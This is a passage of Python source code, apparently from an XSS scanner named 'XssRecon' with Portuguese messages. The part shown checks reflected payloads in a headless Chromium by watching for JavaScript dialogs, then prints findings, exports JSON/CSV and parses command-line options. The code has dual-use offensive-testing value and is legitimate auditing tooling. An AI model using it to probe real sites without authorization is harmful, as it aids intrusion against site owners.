            context = browser.new_context(ignore_https_errors=not verify_ssl)
            cookies = _playwright_cookies_from_session(session, item.target_url)
            if cookies:
                try:
                    context.add_cookies(cookies)
                except Exception:
                    pass
            page = context.new_page()

            def on_dialog(dialog):
                msg = dialog.message
                dialogs.append(msg)
                try:
                    dialog.accept()
                except Exception:
                    pass

            page.on("dialog", on_dialog)

            if method == "GET":
                try:
                    page.goto(browser_target, wait_until="domcontentloaded", timeout=max(timeout, 3) * 1000)
                except PlaywrightTimeoutError:
                    pass
            else:
                action = html_lib.escape(item.target_url, quote=True)
                fname = html_lib.escape(item.field_name, quote=True)
                pvalue = html_lib.escape(payload, quote=True)
                form_html = f'<html><body><form id="f" method="POST" action="{action}"><input name="{fname}" value="{pvalue}"></form><script>document.getElementById("f").submit()</script></body></html>'
                page.set_content(form_html, wait_until="domcontentloaded", timeout=max(timeout, 3) * 1000)
                try:
                    page.wait_for_load_state("domcontentloaded", timeout=max(timeout, 3) * 1000)
                except PlaywrightTimeoutError:
                    pass

            page.wait_for_timeout(1200)
            try:
                content = page.content()
                reflected_in_dom = marker in content or payload in content
            except Exception:
                reflected_in_dom = False
            browser.close()

        if any(marker in d for d in dialogs):
            status = "confirmed_execution"
            evidence = f"Execução confirmada: diálogo JavaScript abriu com marker {marker}."
        elif reflected_in_dom:
            status = "reflected_no_execution"
            evidence = "Payload/marker apareceu no DOM renderizado, mas não executou. Provável escape ou contexto não executável."
        else:
            status = "not_confirmed"
            evidence = "Payload executável não executou e não ficou visível no DOM renderizado."
    except Exception as exc:
        status = "browser_error"
        evidence = f"Erro durante validação com navegador: {exc}"

    return replace(item, test_url=browser_target, execution_status=status, execution_evidence=evidence)


def validate_reflections_with_browser(items: List[ReviewItem], session: requests.Session, timeout: int, verify_ssl: bool, headless: bool) -> List[ReviewItem]:
    total = sum(1 for i in items if i.category == "Auto Validated Reflection")
    validated: List[ReviewItem] = []
    if total:
        UI.title(f"VALIDAÇÃO COM NAVEGADOR - {total} reflexões", color=Fore.CYAN)
    current = 0
    for item in items:
        if item.category == "Auto Validated Reflection":
            current += 1
            UI.info(f"Browser test {current}/{total}: {item.method} {item.field_name} @ {item.target_url}")
            validated.append(validate_reflection_item_with_browser(item, session, timeout, verify_ssl, headless))
        else:
            validated.append(item)
    return validated


def execution_bucket(item: ReviewItem) -> str:
    """Classificação operacional para saída humana e JSON."""
    if item.category == "Auto Validated Reflection":
        if item.execution_status == "confirmed_execution":
            return "confirmed_xss"
        return "possible_xss"
    if item.category == "Static Indicator":
        return "static_indicator"
    return "other"


def browser_status_label(status: str) -> str:
    labels = {
        "confirmed_execution": "XSS confirmado com execução no navegador",
        "reflected_no_execution": "Refletiu, mas não executou no navegador",
        "not_confirmed": "Não confirmado no navegador",
        "not_tested": "Não testado em navegador",
        "browser_missing": "Playwright/Chromium não instalado",
        "browser_error": "Erro na validação com navegador",
    }
    return labels.get(status or "not_tested", status or "not_tested")


def compact_url(url: str, limit: int = 140) -> str:
    if not url:
        return ""
    return url if len(url) <= limit else url[: limit - 3] + "..."


def print_result_card(item: ReviewItem, index: int, *, include_console: bool = False) -> None:
    bucket = execution_bucket(item)
    is_confirmed = bucket == "confirmed_xss"
    is_possible = bucket == "possible_xss"

    if is_confirmed:
        badge = Back.RED + Fore.WHITE + Style.BRIGHT + " XSS CONFIRMADO "
        title_color = Fore.RED + Style.BRIGHT
    elif is_possible:
        badge = Back.RED + Fore.WHITE + Style.BRIGHT + " POSSÍVEL XSS "
        title_color = Fore.RED + Style.BRIGHT
    elif bucket == "static_indicator":
        badge = Back.YELLOW + Fore.BLACK + Style.BRIGHT + " INDICADOR DOM/JS "
        title_color = Fore.YELLOW + Style.BRIGHT
    else:
        badge = Back.WHITE + Fore.BLACK + " INFO "
        title_color = Fore.WHITE

    print(f"\n{badge}{Style.RESET_ALL} {title_color}#{index} {item.context}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}Página:       {Fore.BLUE}{compact_url(item.page_url)}{Style.RESET_ALL}")
    if item.test_url:
        print(f"  {Fore.WHITE}Teste:        {Fore.BLUE}{compact_url(item.test_url, 220)}{Style.RESET_ALL}")
    else:
        print(f"  {Fore.WHITE}Endpoint:     {Fore.BLUE}{compact_url(item.target_url, 220)}{Style.RESET_ALL}")
    if item.field_name:
        print(f"  {Fore.WHITE}Parâmetro:    {Fore.CYAN}{item.field_name}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}Método:       {Fore.CYAN}{item.method}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}Risco:        {Fore.RED if item.risk in {'high', 'medium'} else Fore.YELLOW}{item.risk}{Style.RESET_ALL} | Confiança: {item.confidence}")

    if item.category == "Auto Validated Reflection":
        color = Fore.RED if item.execution_status == "confirmed_execution" else Fore.YELLOW
        print(f"  {Fore.WHITE}Browser:      {color}{browser_status_label(item.execution_status)}{Style.RESET_ALL}")
        if item.execution_evidence:
            print(f"  {Fore.WHITE}Evidência BR: {Style.DIM}{short_text(item.execution_evidence, 220)}{Style.RESET_ALL}")

    print(f"  {Fore.WHITE}Evidência:    {Style.DIM}{short_text(item.evidence, 260)}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}Nota:         {Style.DIM}{short_text(item.notes, 220)}{Style.RESET_ALL}")

    if include_console and item.manual_console_test:
        print(f"  {Fore.WHITE}Console helper:\n{Fore.CYAN}{item.manual_console_test}{Style.RESET_ALL}")


def print_final_findings_summary(items: List[ReviewItem]) -> None:
    confirmed = [i for i in items if execution_bucket(i) == "confirmed_xss"]
    possible = [i for i in items if execution_bucket(i) == "possible_xss"]

    UI.title("RESUMO FINAL DOS ACHADOS", color=Fore.RED)

    if confirmed:
        print(f"{Back.RED}{Fore.WHITE}{Style.BRIGHT} XSS CONFIRMADO COM EXECUÇÃO - {len(confirmed)} {Style.RESET_ALL}")
        for idx, item in enumerate(confirmed, start=1):
            print(
                f"  {Fore.RED}{idx}. {item.method} {item.field_name or '-'} "
                f"| {item.context} | {Fore.BLUE}{compact_url(item.test_url or item.target_url, 220)}{Style.RESET_ALL}"
            )
    else:
        print(f"{Fore.GREEN}[+] Nenhum XSS com execução confirmada no navegador.{Style.RESET_ALL}")

    if possible:
        print(f"\n{Back.RED}{Fore.WHITE}{Style.BRIGHT} POSSÍVEIS XSS / REFLEXÕES A VALIDAR - {len(possible)} {Style.RESET_ALL}")
        for idx, item in enumerate(possible, start=1):
            print(
                f"  {Fore.RED}{idx}. {item.method} {item.field_name or '-'} "
                f"| {item.context} | {browser_status_label(item.execution_status)} | "
                f"{Fore.BLUE}{compact_url(item.test_url or item.target_url, 220)}{Style.RESET_ALL}"
            )
    else:
        print(f"{Fore.GREEN}[+] Nenhuma reflexão pendente classificada como possível XSS.{Style.RESET_ALL}")


def print_summary(items: List[ReviewItem], stats: ScanStats, show_info: bool) -> None:
    confirmed = [i for i in items if execution_bucket(i) == "confirmed_xss"]
    possible = [i for i in items if execution_bucket(i) == "possible_xss"]
    static = [i for i in items if execution_bucket(i) == "static_indicator"]

    UI.title("PAINEL EXECUTIVO DA AUDITORIA", color=Fore.CYAN)
    print(f" {Fore.WHITE}Páginas scaneadas:        {stats.pages}")
    print(f" {Fore.WHITE}Requests feitas:          {stats.requests}")
    print(f" {Fore.WHITE}Testes automáticos:       {stats.auto_tests}")
    print(f" {Fore.WHITE}Formulários vistos:       {stats.forms}")
    print(f" {Fore.RED}XSS confirmado/browser:   {len(confirmed)}")
    print(f" {Fore.RED}Possíveis XSS/reflexões:  {len(possible)}")
    print(f" {Fore.YELLOW}Indicadores DOM/JS:       {len(static)}")
    print(f" {Fore.GREEN}Total de itens:           {len(items)}")
    print(f" {Fore.MAGENTA}Erros:                    {stats.errors}")
    UI.line()

    if not items:
        UI.ok("Nenhum ponto relevante encontrado.")
        return

    if confirmed:
        UI.title(f"XSS CONFIRMADO COM EXECUÇÃO - {len(confirmed)}", color=Fore.RED)
        for idx, item in enumerate(confirmed, start=1):
            print_result_card(item, idx, include_console=False)

    if possible:
        UI.title(f"POSSÍVEIS XSS / REFLEXÕES - {len(possible)}", color=Fore.RED)
        for idx, item in enumerate(possible, start=1):
            print_result_card(item, idx, include_console=False)

    if show_info and static:
        UI.title(f"INDICADORES ESTÁTICOS DOM/JS - {len(static)}", color=Fore.YELLOW)
        for idx, item in enumerate(static, start=1):
            print_result_card(item, idx, include_console=False)
    elif static:
        UI.info("Indicadores DOM/JS ocultos na tela. Use --show-static para exibir.")

    print_final_findings_summary(items)


def item_to_readable_dict(item: ReviewItem) -> Dict[str, object]:
    classification = execution_bucket(item)
    title = "XSS confirmado com execução" if classification == "confirmed_xss" else "Possível XSS / reflexão a validar" if classification == "possible_xss" else "Indicador estático DOM/JS"
    return {
        "classification": classification,
        "title": title,
        "risk": item.risk,
        "confidence": item.confidence,
        "context": item.context,
        "parameter": item.field_name or None,
        "method": item.method,
        "urls": {
            "page": item.page_url,
            "endpoint": item.target_url,
            "test": item.test_url or None,
        },
        "payloads": {
            "canary": item.payload or None,
            "test_command_or_url": item.test_url or None,
        },
        "browser_validation": {
            "status": item.execution_status,
            "status_label": browser_status_label(item.execution_status),
            "evidence": item.execution_evidence or None,
        },
        "evidence": {
            "html_or_dom_snippet": item.evidence,
            "notes": item.notes,
            "hash": item.content_hash,
        },
        "manual_console_helper": item.manual_console_test or None,
    }


def build_readable_json(items: List[ReviewItem], stats: ScanStats) -> Dict[str, object]:
    confirmed = [i for i in items if execution_bucket(i) == "confirmed_xss"]
    possible = [i for i in items if execution_bucket(i) == "possible_xss"]
    static = [i for i in items if execution_bucket(i) == "static_indicator"]
    return {
        "metadata": {
            "tool": "XssRecon",
            "version": VERSION,
            "generated_at_utc": datetime.now(timezone.utc).isoformat(),
        },
        "summary": {
            "pages_scanned": stats.pages,
            "requests_made": stats.requests,
            "automatic_tests": stats.auto_tests,
            "forms_seen": stats.forms,
            "errors": stats.errors,
            "confirmed_xss_count": len(confirmed),
            "possible_xss_count": len(possible),
            "static_dom_js_indicator_count": len(static),
            "total_items": len(items),
        },
        "findings": {
            "confirmed_xss": [item_to_readable_dict(i) for i in confirmed],
            "possible_xss": [item_to_readable_dict(i) for i in possible],
            "static_dom_js_indicators": [item_to_readable_dict(i) for i in static],
        },
        "raw_items": [asdict(item) for item in items],
    }


def export_json(path: str, items: List[ReviewItem], stats: ScanStats) -> None:
    output = build_readable_json(items, stats)
    Path(path).write_text(json.dumps(output, ensure_ascii=False, indent=2), encoding="utf-8")
    UI.ok(f"Resultado JSON salvo em: {path}")

def export_csv(path: str, items: List[ReviewItem]) -> None:
    fields = list(ReviewItem.__dataclass_fields__.keys())
    with open(path, "w", newline="", encoding="utf-8") as fh:
        writer = csv.DictWriter(fh, fieldnames=fields)
        writer.writeheader()
        for item in items:
            writer.writerow(asdict(item))
    UI.ok(f"Resultado CSV salvo em: {path}")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Scanner XSS/reflexão com validação automática segura.")
    parser.add_argument("url", help="URL inicial do alvo")
    parser.add_argument("--depth", type=int, default=2, help="Profundidade máxima do crawl")
    parser.add_argument("--max-pages", type=int, default=DEFAULT_MAX_PAGES, help="Máximo de páginas a visitar")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="Timeout por request em segundos")
    parser.add_argument("--cookie", help="Cookie header completo")
    parser.add_argument("--insecure", action="store_true", help="Desabilita verificação SSL")
    parser.add_argument("--allow-external", action="store_true", help="Permite seguir links fora do host inicial")
    parser.add_argument("--no-auto-validate", action="store_true", help="Desativa submissão automática de forms/params")
    parser.add_argument("--show-static", action="store_true", help="Exibe também indicadores estáticos de JS/DOM")
    parser.add_argument("--no-static", action="store_true", help="Não coleta indicadores estáticos")
    parser.add_argument("--max-tests-per-page", type=int, default=20, help="Limite de testes automáticos por página")
    parser.add_argument("--json-out", help="Caminho para salvar resultado em JSON")
    parser.add_argument("--csv-out", help="Caminho para salvar resultado em CSV")
    parser.add_argument("--browser-validate", action="store_true", help="Usa Chromium/Playwright para validar execução real de XSS refletido")
    parser.add_argument("--headed", action="store_true", help="Abre o navegador visível durante --browser-validate")
    return parser


def configure_session(cookie_header: Optional[str]) -> requests.Session:
    session = requests.Session()
    session.headers.update(HEADERS)
    if cookie_header:
        cookie = SimpleCookie()
        cookie.load(cookie_header)
        for key, morsel in cookie.items():
            session.cookies.set(key, morsel.value)
        UI.ok("Cookies carregados.")
    return session


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()

    start_url = normalize_url(args.url, "")
    if not is_supported_url(start_url):
        UI.warn("A URL precisa começar com http:// ou https://")
        return 2

    verify_ssl = not args.insecure
    same_host_only = not args.allow_external
    auto_validate = not args.no_auto_validate
    static_indicators = not args.no_static

    UI.banner()
    UI.info(f"Iniciando scan em: {Fore.WHITE}{start_url}")
    UI.info(f"Profundidade: {args.depth} | Máx páginas: {args.max_pages} | Timeout: {args.timeout}s")
    UI.info(f"Auto validação: {'ativa' if auto_validate else 'desativada'} | Máx testes/página: {args.max_tests_per_page}")
    if not verify_ssl:
        UI.warn("Verificação SSL desativada.")
    if same_host_only:
        UI.info("Crawl restrito ao mesmo host.")
    else:
        UI.warn("Crawl liberado para links externos.")

    session = configure_session(args.cookie)
    results, stats = crawl_site(
        session=session,
        start_url=start_url,
        depth=args.depth,
        max_pages=args.max_pages,
        timeout=args.timeout,
        verify_ssl=verify_ssl,
        same_host_only=same_host_only,
        auto_validate=auto_validate,
        static_indicators=static_indicators,
        max_tests_per_page=args.max_tests_per_page,
    )

    if args.browser_validate:
        results = validate_reflections_with_browser(results, session, args.timeout, verify_ssl, headless=not args.headed)

    # Recalcula os contadores após eventual validação com navegador.
    stats.review_items = len(results)
    stats.confirmed_reflections = sum(1 for item in results if item.category == "Auto Validated Reflection")
    stats.high_risk_reflections = sum(1 for item in results if item.category == "Auto Validated Reflection" and item.execution_status == "confirmed_execution")
    stats.sinks = sum(1 for item in results if item.category == "Static Indicator")

    print_summary(results, stats, show_info=args.show_static)
    if args.json_out:
        export_json(args.json_out, results, stats)
    if args.csv_out:
        export_csv(args.csv_out, results)
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrompido pelo usuário.")
        raise SystemExit(130)
